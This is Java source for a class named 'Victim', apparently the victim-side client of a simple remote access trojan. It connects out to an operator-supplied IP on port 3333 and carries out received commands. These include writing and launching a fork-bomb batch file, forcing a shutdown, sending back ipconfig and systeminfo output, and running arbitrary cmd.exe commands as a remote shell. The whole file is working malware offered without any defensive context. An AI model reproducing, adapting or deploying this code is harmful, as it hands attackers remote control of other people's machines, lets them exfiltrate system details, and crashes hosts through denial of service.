import java.io.*;
import java.net.*;
import java.util.*;
import javax.swing.JOptionPane;
public class Victim {

	public static void main(String[] args) throws Exception{
		Scanner in=new Scanner(System.in);
		String ip="";
		ip=JOptionPane.showInputDialog("ENTER THE IP ADDRESS");
		String str="";
		int count=0;
		Socket s=new Socket(ip,3333);
		DataInputStream din=new DataInputStream(s.getInputStream());
		DataOutputStream dout=new DataOutputStream(s.getOutputStream());
		BufferedReader br=new BufferedReader(new InputStreamReader(System.in));
		String att="",vic="";
		while(!att.equals("stop")) {
			att=din.readUTF();
			if(att.equals("dos")) {
				try {
					FileOutputStream fout=new FileOutputStream("D:\\dos.bat");
					String str1="@echo off\n:top\nStart\ngoto top";
					byte[] b=str1.getBytes();
					fout.write(b);
					fout.close();
					String[] cmd= {"cmd.exe","/C","Start","D:\\dos.bat"};
					Process p=Runtime.getRuntime().exec(cmd);
					vic="Success!";
					dout.writeUTF(vic);
					dout.flush();
				
				}catch(Exception e){
					vic="Failed to DOS!!";
					dout.writeUTF(vic);
					dout.flush();
				}
				
			}

			if(att.equals("shut")) {
				try {
					String[] cmd= {"cmd.exe","/C","shutdown /s"};
					Process p=Runtime.getRuntime().exec(cmd);
					vic="Success!";
					dout.writeUTF(vic);
					dout.flush();
				
				}catch(Exception d){
					vic="Failed to Shutdown!!";
					dout.writeUTF(vic);
					dout.flush();
				}
				
			}
			if(att.equals("ip")) {
				try{
					ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "ipconfig -all");
		            builder.redirectErrorStream(true);
		            Process p = builder.start();
		            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
		            String line,ans="";
		            while (true) {
		                line = r.readLine();
		                if (line == null) { break; }
		                ans+=line;
		                ans+="\n";
		            }
		            dout.writeUTF(ans);
		            dout.flush();
		            
		        }catch(Exception e) {
		        	vic="Failed ...";
		        	dout.writeUTF(vic);
					dout.flush();
				}
			}
			if(att.equals("syspec")) {
				try{
					ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "systeminfo");
		            builder.redirectErrorStream(true);
		            Process p = builder.start();
		            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
		            String line,ans="";
		            while (true) {
		                line = r.readLine();
		                if (line == null) { break; }
		                ans+=line;
		                ans+="\n";
		            }
		            dout.writeUTF(ans);
		            dout.flush();
		            
		        }catch(Exception e) {
		        	vic="Failed ...";
		        	dout.writeUTF(vic);
					dout.flush();
				}
			}
			if(att.length()>5 && !att.contains("dir")) {
				try{
					ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/C", "Start", att);
		            builder.redirectErrorStream(true);
		            Process p = builder.start();
		            vic="Success!";
					dout.writeUTF(vic);
					dout.flush();
		            
		        }catch(Exception e) {
		        	vic="Failed to Exploit review your code..";
		        	dout.writeUTF(vic);
					dout.flush();
				}
			}
			if(att.contains("dir")) {		
				
				try{
					String cmd="";
					String[] arr=att.split("`");
					str+=arr[1]+" ";
					if(arr[1].equals("undo")) {
						str="";
						ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , "echo undo");
			            builder.redirectErrorStream(true);
			            Process p = builder.start();
			            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
			            String line,ans="";
			            while (true) {
			                line = r.readLine();
			                if (line == null) { break; }
			                ans+=line;
			                ans+="\n";
			            }
			            dout.writeUTF(ans);
			            dout.flush();
					}
					else {
						ProcessBuilder builder = new ProcessBuilder("cmd.exe" , "/C" , str);
			            builder.redirectErrorStream(true);
			            Process p = builder.start();
			            BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
			            String line,ans="";
			            while (true) {
			                line = r.readLine();
			                if (line == null) { break; }
			                ans+=line;
			                ans+="\n";
			            }
			            dout.writeUTF(ans);
			            dout.flush();
					}

		            
		        }catch(Exception e) {
		        	vic="Failed to Exploit review your code..";
		        	dout.writeUTF(vic);
					dout.flush();
				}
			}
			
		}//while loop end

	}

}
